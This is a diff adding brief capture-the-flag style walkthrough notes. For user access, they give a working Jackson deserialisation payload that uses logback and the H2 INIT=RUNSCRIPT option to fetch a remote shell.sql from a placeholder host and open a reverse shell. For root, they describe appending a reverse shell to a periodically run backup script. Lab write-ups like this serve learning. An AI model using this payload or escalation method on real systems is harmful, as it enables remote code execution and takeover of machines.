@@ -1,0 +1,13 @@
+FOR USER:
+notice that 'jackson' sometimes appears in displayed error messages of the validate function
+turns out jackson has deserialisation vulnerability which allows users to use and control arbitrary java objects
+
+JSON INPUT:
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://<IP>:<PORT>/shell.sql'"}]
+this will run a user provided sql script (SEE THIS FOLDER) to get reverse shell and user.
+
+FOR ROOT:
+
+notice that timer_backup.sh is owned by pericles and on the path.
+pspy output will show that this script is run periodically
+add reverse shell payload to timer_backup.sh for root
